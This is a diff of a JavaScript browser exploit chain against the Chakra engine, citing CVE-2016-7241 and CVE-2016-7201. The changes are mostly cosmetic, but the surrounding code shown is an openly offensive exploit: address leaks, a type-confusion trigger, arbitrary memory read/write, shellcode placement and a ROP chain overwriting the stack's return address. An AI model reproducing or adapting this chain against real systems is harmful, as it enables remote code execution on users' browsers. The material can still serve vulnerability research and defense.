@@ -20,7 +20,7 @@ var vtable = Read64(new Long(lo - 0x58, hi, true));
 
 var chakraBase = Read64(vtable).sub(0x2F920);
 
-var threadCtxPtr = Read64(chakraBase.add(0x6FCD10)); // class ThreadContext * ThreadContext::globalListLast
+var threadCtxPtr = Read64(chakraBase.add(0x6FCD10)); // ThreadContext * ThreadContext::globalListLast
 
 var stackLimit = Read64(threadCtxPtr.add(0x388));
 
@@ -39,8 +39,8 @@ for (var i = 8; i < 32 * 1024; i += 8)
 }
 var retCodeAddr = Read64(retPtrAddr);
 
-// shellcode size
 var shellLen = 0x1000;
+
 // create shell code
 var z = new Uint8Array([
     0xC3, 0x90, 0x90, 0x90, 
@@ -54,18 +54,14 @@ var scU32 = new Uint32Array(z.buffer);
 var realShellCode = (new Array(shellLen)).slice();
 
 var shellcAddr = getAddressLong(realShellCode);
-alert("shell code address: 0x" + shellcAddr.toString(16));
 
 var shcodeAddr = Read64(shellcAddr.add(0x28));  // offset (0x28) to the pointer to the buffer
-shcodeAddr = shcodeAddr.add(8); // advance to start of buff
-
-var origScAddr = shcodeAddr;
+shcodeAddr = shcodeAddr.add(8); // advance to start of buffer
 
 for(var i = 0; i < scU32.length;i+=2)
 {
     Write64(shcodeAddr.add(i * 4), new Long(scU32[i], scU32[i+1], true));
 }
-shcodeAddr = origScAddr;
 
 var filler = new Long(0, 0, true);
 
@@ -120,10 +116,9 @@ for (var i = 0; i < rop.length; ++i)
     Write64(retPtrAddr.add(i * 8), rop[i]);
 }
 
-
 alert("Exploit done!");
 
-/*(CVE-2016-7241) */
+/*(CVE-2016-7241)*/
 function getAddress(y)
 {
     var b = false;
@@ -156,7 +151,8 @@ function getAddressLong(y)
     JSON.parse("[1, 2]", f);
     return new Long(a[0], a[1], true);
 }
-/*(CVE-2016-7201) */
+
+/*(CVE-2016-7201)*/
 function TriggerFillFromPrototypesBug(lo, hi)
 {
     // Type* (which has TypeId)
@@ -191,6 +187,7 @@ function TriggerFillFromPrototypesBug(lo, hi)
     a.shift.call(b);
     dv = b[2];
 }
+
 /* Utility */
 function SetAddress(addr)
 {
